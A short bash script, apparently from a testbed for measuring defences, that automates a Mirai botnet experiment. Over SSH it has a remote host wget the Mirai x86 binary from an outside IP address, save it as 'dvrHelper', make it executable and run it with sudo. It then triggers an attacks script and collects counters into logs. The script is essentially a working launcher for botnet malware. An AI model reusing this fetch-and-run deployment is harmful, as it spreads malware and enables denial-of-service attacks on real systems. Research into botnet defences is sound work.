#!/bin/bash

#bash start_targets.sh 112; sleep 10s; bash load_bot.sh 19; bash regras.sh mtd; bash run_bot.sh 19; bash attacks.sh; bash stop_targets.sh 112; bash get_counters.sh 1ne10 mtd10

function run_scenario() {
	#SERVER="192.168.56.3"
	SERVER="216.58.202.227"
	#SERVER="216.58.202.229"

	#until ssh mirai@$SERVER "cp Mirai-Source-Code/mirai/release/mirai.x86 ./dvrHelper"; do sleep 5 ; done;
	until ssh mirai@$SERVER "wget http://216.58.202.229/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"; do sleep 5 ; done;
	bash start_targets.sh 112;
	bash regras.sh $1;
	until ssh mirai@$SERVER "sudo ./dvrHelper";  do sleep 5 ; done;
	bash attacks.sh;
	bash stop_targets.sh 112;
	bash get_counters.sh cloud$2 $3$2;
	ssh mirai@$SERVER "sudo reboot";
}

echo "open 3"
run_scenario all 3 open  > logscloud3open.txt
